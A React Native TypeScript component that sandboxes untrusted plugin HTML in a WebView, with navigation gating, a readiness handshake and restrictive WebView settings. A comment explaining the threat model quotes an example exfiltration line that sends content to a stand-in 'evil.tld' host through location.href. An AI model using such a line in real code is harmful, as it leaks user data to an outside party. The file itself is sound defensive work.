import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import { View } from "react-native";
import { WebView, type WebViewMessageEvent } from "react-native-webview";
import { StyleSheet, withUnistyles } from "react-native-unistyles";
import {
  createInitMessage,
  createUpdateMessage,
  handlePluginGuestMessage,
  wrapPluginHostDocument,
  type PluginHostMessage,
  type PluginSandboxProps,
} from "./bridge";
import {
  resolvePluginThemeTokens,
  useStableThemeTokens,
  type ThemedPluginSandboxProps,
} from "./theme";
import { isPluginDocumentUrl } from "./sandbox-url";
import { PLUGIN_READY_TIMEOUT_MS, PluginReadyTimeout } from "./sandbox-error";

/**
 * Widening this to `*` is what narrows the hole, however wrong it reads.
 * react-native-webview checks the whitelist *before* it calls
 * `onShouldStartLoadWithRequest`: a non-whitelisted URL is handed to
 * `Linking.openURL`, which opens it in the user's real browser — so
 * `location.href = "https://evil.tld/?d=" + content` exfiltrates and our
 * callback never runs. With `*` every navigation reaches the callback below,
 * which is then the sole gate.
 */
const ORIGIN_WHITELIST = ["*"];

function PluginSandboxView({
  html,
  context,
  onOpenFile,
  testID,
  themeTokens: rawThemeTokens,
}: ThemedPluginSandboxProps) {
  const themeTokens = useStableThemeTokens(rawThemeTokens);
  const webViewRef = useRef<WebView | null>(null);
  const readyRef = useRef(false);
  const [handshake, setHandshake] = useState<"waiting" | "ready" | "timeout">("waiting");
  const [attempt, setAttempt] = useState(0);
  const latest = useRef({ context, onOpenFile, themeTokens });

  useEffect(() => {
    latest.current = { context, onOpenFile, themeTokens };
  }, [context, onOpenFile, themeTokens]);

  // Reset during render, not in an effect: an effect resets one commit late, so
  // a plugin swapped in while a panel is open would show the previous plugin's
  // outcome for a frame. Keyed on the html string rather than the memoized
  // source object — React may throw a `useMemo` cache away and hand back a new
  // object for unchanged html, and a reset on that flips a settled `ready` back
  // to waiting with nothing left to re-send it.
  const [renderedHtml, setRenderedHtml] = useState(html);
  // Which document the messages arriving now belong to. A WebView swaps
  // documents asynchronously, so this is the only way to tell the outgoing
  // plugin's late `ready` from the incoming plugin's.
  const [documentId, setDocumentId] = useState(1);
  if (renderedHtml !== html) {
    setRenderedHtml(html);
    setDocumentId((current) => current + 1);
    readyRef.current = false;
    setHandshake("waiting");
  }

  const source = useMemo(
    () => ({ html: wrapPluginHostDocument(html, documentId) }),
    [html, documentId],
  );

  useEffect(() => {
    if (handshake !== "waiting") {
      return;
    }
    const timer = setTimeout(() => setHandshake("timeout"), PLUGIN_READY_TIMEOUT_MS);
    return () => clearTimeout(timer);
  }, [handshake, attempt, html]);

  const handleRetry = useCallback(() => {
    readyRef.current = false;
    setHandshake("waiting");
    setAttempt((current) => current + 1);
  }, []);

  // Into the host document, which forwards it down to the plugin frame. The
  // plugin is no longer the top document, so dispatching a MessageEvent here
  // would land in the wrong realm.
  const post = useCallback((message: PluginHostMessage) => {
    // Guarded because a throw here happens inside the WebView, where nothing on
    // this side ever sees it.
    webViewRef.current?.injectJavaScript(
      `if (typeof window.__paseoPost === "function") window.__paseoPost(${JSON.stringify(message)}); true;`,
    );
  }, []);

  const handleMessage = useCallback(
    (event: WebViewMessageEvent) => {
      handlePluginGuestMessage(
        event.nativeEvent.data,
        {
          onReady: () => {
            readyRef.current = true;
            setHandshake("ready");
            post(createInitMessage(latest.current.context, latest.current.themeTokens));
          },
          onOpenFile: (input) => latest.current.onOpenFile?.(input),
        },
        { documentId },
      );
    },
    [post, documentId],
  );

  useEffect(() => {
    if (!readyRef.current) {
      return;
    }
    post(createUpdateMessage(context, themeTokens));
  }, [context, themeTokens, post]);

  /**
   * Stateless on purpose: counting loads would grant the first callback
   * invocation whatever it is, and Android does not fire this for programmatic
   * or POST loads, so the plugin's first real navigation could be the one
   * allowed. Judge the URL instead.
   */
  const allowPluginDocumentOnly = useCallback(
    (request: { url: string }) => isPluginDocumentUrl(request.url),
    [],
  );

  // Hidden rather than unmounted, for the same reason the web sandbox keeps its
  // container: unmounting destroys the guest and every byte of load progress
  // with it. A plugin that is merely slow — a large inline bundle on a cold
  // WebView, which is a low-end Android away — would then time out, be killed,
  // be retried from zero, and time out again, with no state it can ever finish
  // in. Kept alive, a late `ready` dismisses the card on its own.
  return (
    <View style={styles.container} testID={testID}>
      <View style={handshake === "timeout" ? styles.hidden : styles.fill}>
        <WebView
          key={attempt}
          ref={webViewRef}
          style={styles.webView}
          source={source}
          originWhitelist={ORIGIN_WHITELIST}
          onShouldStartLoadWithRequest={allowPluginDocumentOnly}
          onMessage={handleMessage}
          javaScriptEnabled
          incognito
          domStorageEnabled={false}
          allowFileAccess={false}
          allowsLinkPreview={false}
          cacheEnabled={false}
          mediaPlaybackRequiresUserAction
          setSupportMultipleWindows={false}
          thirdPartyCookiesEnabled={false}
        />
      </View>
      {handshake === "timeout" ? <PluginReadyTimeout onRetry={handleRetry} /> : null}
    </View>
  );
}

/**
 * The theme reaches the plugin as a prop rather than a hook so a theme switch
 * re-renders this subtree. `useUnistyles()` would do it too and is banned
 * (docs/unistyles.md).
 */
export const PluginSandbox = withUnistyles(PluginSandboxView, (theme) => ({
  themeTokens: resolvePluginThemeTokens(theme),
})) as (props: PluginSandboxProps) => React.ReactElement;

const styles = StyleSheet.create((theme) => ({
  container: {
    flex: 1,
    minHeight: 0,
  },
  fill: {
    flex: 1,
    minHeight: 0,
  },
  hidden: {
    display: "none",
  },
  webView: {
    flex: 1,
    minHeight: 0,
    backgroundColor: theme.colors.surface0,
  },
}));
